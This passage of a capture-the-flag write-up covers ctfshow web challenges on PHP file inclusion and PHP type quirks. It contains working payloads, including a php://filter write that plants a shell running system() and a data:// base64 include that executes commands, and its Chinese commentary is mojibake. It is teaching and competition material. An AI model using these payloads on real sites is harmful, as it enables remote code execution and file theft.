data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿™é‡Œä»–æ”¹å˜äº†å½¢å¼ï¼Œæˆå†™å…¥ï¼Œç»•è¿‡è¿‡æ»¤å†™å…¥ä¸ªæ–‡ä»¶å³å¯

?file=php://filter/write=string.ror13/resource=1.php

è¿™é‡Œå› ä¸ºfile_put_contents(urldecode)æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ä»¥ä¸Šä»£ç è¿›è¡Œurlencodeå…¨å­—ç¬¦ç¼–ç ä¸¤æ¬¡
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30

ç„¶åpostæ–¹å¼è¾“å‡ºcontent=&lt;?php system('tac f*.php');?&gt;
&lt;?php system('tac f*.php');?&gt;éœ€è¦è¿›è¡Œrot13ç¼–ç 


payloadï¼š
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
post:content=&lt;?cuc flfgrz('gnp s*.cuc');?&gt;

</code></pre><pre><code>ctfshow&#123;3d4bd38d-7bbc-43df-a5ab-6833c91e9edf&#125;
</code></pre><h2 id="web88"><a class="anchor" href="#web88">#</a> web88</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-17 02:27:25</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre> */</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯æ²¡è¿‡æ»¤ï¼šæ‰€ä»¥è¿˜æ˜¯èƒ½ç”¨phpä¼ªåè®®ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨data://ï¼Œbase64æ—¶è®°å¾—åˆ æ‰åé¢çš„=

payload:
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs
</code></pre><pre><code>ctfshow&#123;30bb2962-3cc0-427e-906e-8d32462fe7c4&#125;
</code></pre><h2 id="web116"><a class="anchor" href="#web116">#</a> web116</h2><p>å‰ªè¾‘è§†é¢‘</p><p>æŠ“åŒ…</p><p>file=flag.php</p><p>å³å¯è¿”å› flag</p><h1 id="phpç‰¹æ€§"><a class="anchor" href="#phpç‰¹æ€§">#</a> php ç‰¹æ€§</h1><h2 id="web89"><a class="anchor" href="#web89">#</a> web89</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 15:38:51</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤äº†æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡

payload:
?num[]=1
</code></pre><h2 id="web90"><a class="anchor" href="#web90">#</a> web90</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:06:11</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>4476è½¬æ¢åå…­è¿›åˆ¶0x117c

payload:
?num=0x117c		//åå…­è¿›åˆ¶
?num=010574		//å…«è¿›åˆ¶	
?num=4476a		//===å¼ºæ¯”è¾ƒ
</code></pre><h2 id="web91"><a class="anchor" href="#web91">#</a> web91</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:16:09</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>Notice<span class="token punctuation">:</span> Undefined index<span class="token punctuation">:</span> cmd in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span></pre></td></tr><tr><td data-num="29"></td><td><pre>nonononono</pre></td></tr></table></figure><pre><code>è¿™é‡Œä¸»è¦çš„çªç ´ç‚¹å°±æ˜¯/mï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªpreg_match()å‡½æ•°ï¼Œæœ‰ä¸ª/mï¼Œè€Œç¬¬äºŒä¸ªæ­£åˆ™åˆ™æ²¡æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡%0a

payload:
?cmd=%0aphp
</code></pre><h2 id="web92"><a class="anchor" href="#web92">#</a> web92</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:29:30</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>==å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥4476aå’Œ4476ç›¸ç­‰
è¿™æ—¶åªèƒ½é€šè¿‡åå…­è¿›åˆ¶ç»•è¿‡

payloadï¼š
?num=0x117c		//åå…­è¿›åˆ¶
?num=4476e123
</code></pre><h2 id="web93"><a class="anchor" href="#web93">#</a> web93</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:32:58</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤äº†å­—æ¯ï¼Œé‚£å°±ç”¨å…«è¿›åˆ¶

payload:
?num=010574
